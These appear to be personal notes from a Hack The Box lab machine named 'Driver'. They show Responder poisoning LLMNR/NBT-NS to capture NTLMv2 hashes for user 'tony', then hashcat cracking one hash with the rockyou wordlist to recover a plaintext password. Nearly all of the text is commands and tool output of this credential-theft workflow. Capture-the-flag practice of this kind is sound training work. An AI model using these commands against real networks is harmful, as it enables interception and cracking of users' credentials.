# Loot
## NTLMv2 hash intercepted and cracked via hash cat
```bash
~/Dropbox/Documents/htb/boxes/driver 1m 15s ❯ sudo responder -wrf --lm -v -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [ON]
    Fingerprint hosts          [ON]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.98]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-L852UJ3HGVX]
    Responder Domain Name      [U68G.LOCAL]
    Responder DCE-RPC Port     [45131]

[+] Listening for events...

[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:5dfc47c93506660a:06BC614D1A8E1FDA34EDDE75BE3A73FD:010100000000000078A642ED79BBD70173F01B00C65F8A5F00000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:097101cca6393d11:D8D892850372EC47CBDBADFA3EC6FD7F:010100000000000023C987ED79BBD701BD2FEE307F38135E00000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:c7e568449408086e:958F02A02751EF7F00BCE679E72101D4:0101000000000000B9B1CAED79BBD70127F2604DC19B96F100000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:5658398149eeca77:F9B644614493DF6EB8FE956435961734:010100000000000028AE0FEE79BBD7017C46ADB89C1255DC00000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:3e994380ba1e398d:2C030CA38FEC81B7D654EC0F570AC64E:010100000000000059D254EE79BBD701A6F000AEC1C1DF8900000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:ce0d17c1b678fdfb:5D6E78A6A3E136B2066C2B55343E15C4:01010000000000008C9897EE79BBD7017768347B52BC810500000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:c61fbe0c35b5c167:03BE8D54CB224656162CFDD067B82A04:010100000000000032B8DCEE79BBD7019A63B0ACA1EF19A100000000020000000000000000000000
```
```bash
~/Dropbox/Documents/htb/boxes/driver ❯ hashcat -m 5600  --force hash.hash /home/kali/Dropbox/Documents/htb/boxes/compromised/rockyou.txt
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-4460  CPU @ 3.20GHz, 5716/5780 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /home/kali/Dropbox/Documents/htb/boxes/compromised/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

TONY::DRIVER:c61fbe0c35b5c167:03be8d54cb224656162cfdd067b82a04:010100000000000032b8dcee79bbd7019a63b0aca1ef19a100000000020000000000000000000000:liltony

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: TONY::DRIVER:c61fbe0c35b5c167:03be8d54cb224656162cf...000000
Time.Started.....: Thu Oct  7 10:56:54 2021, (1 sec)
Time.Estimated...: Thu Oct  7 10:56:55 2021, (0 secs)
Guess.Base.......: File (/home/kali/Dropbox/Documents/htb/boxes/compromised/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   484.2 kH/s (3.49ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 32768/14344385 (0.23%)
Rejected.........: 0/32768 (0.00%)
Restore.Point....: 28672/14344385 (0.20%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: softball27 -> eatme1

Started: Thu Oct  7 10:56:32 2021
Stopped: Thu Oct  7 10:56:56 2021
```

## cracked NTLMv2 hash via hashcat
`TONY::DRIVER:c61fbe0c35b5c167:03be8d54cb224656162cfdd067b82a04:010100000000000032b8dcee79bbd7019a63b0aca1ef19a100000000020000000000000000000000:liltony`
